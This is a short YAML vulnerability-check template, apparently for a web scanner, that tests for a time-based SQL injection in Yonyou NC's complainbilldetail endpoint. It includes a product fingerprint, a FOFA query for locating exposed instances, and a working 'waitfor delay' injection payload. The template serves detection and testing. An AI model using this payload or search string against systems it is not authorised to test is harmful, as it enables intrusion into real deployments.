id: poc-yaml-yongyou-nc-complainbilldetail-sqli
info:
  name: 用友 NC complainbilldetail SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /index.jsp
  expression: status_code == 200 && contains(body,"<TITLE>Yonyou NC</TITLE>")
- method: GET
  path: /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:{{.t1}}'--
  expression: 'status_code == 500 &&

    contains(body,"Yonyou NC") &&

    duration > t1 &&

    duration < t2

    '
transport: http
